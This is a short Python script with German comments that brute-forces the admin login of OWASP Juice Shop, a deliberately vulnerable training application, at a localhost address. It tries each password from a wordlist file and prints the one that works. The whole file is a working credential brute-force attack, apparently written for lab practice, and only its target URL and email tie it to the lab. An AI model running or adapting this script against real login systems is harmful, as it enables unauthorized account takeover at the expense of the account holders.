import requests
import os

# Ziel-URL
url = "http://localhost:3000/rest/user/login"

# Dynamischer Pfad zur Passwortliste (im selben Verzeichnis wie das Skript)
password_file = os.path.join(os.path.dirname(__file__), "dirbrute.txt")

# Ziel-E-Mail-Adresse
email = "admin@juice-sh.op"

def bruteforce_login(url, email, password_file):
    try:
        with open(password_file, "r") as file:
            for password in file:
                password = password.strip()  # Entfernt Leerzeichen oder Zeilenumbrüche
                payload = {"email": email, "password": password}
                headers = {
                    "Content-Type": "application/json"
                }
                response = requests.post(url, json=payload, headers=headers)

                # Prüft, ob der Login erfolgreich war
                if response.status_code == 200 and "authentication" in response.text.lower():
                    print(f"Erfolgreich eingeloggt! Passwort: {password}")
                    break
                else:
                    print(f"Versuch mit Passwort: {password} fehlgeschlagen.")
    except FileNotFoundError:
        print("Passwortdatei nicht gefunden!")
    except Exception as e:
        print(f"Ein Fehler ist aufgetreten: {e}")

# Bruteforce starten
bruteforce_login(url, email, password_file)
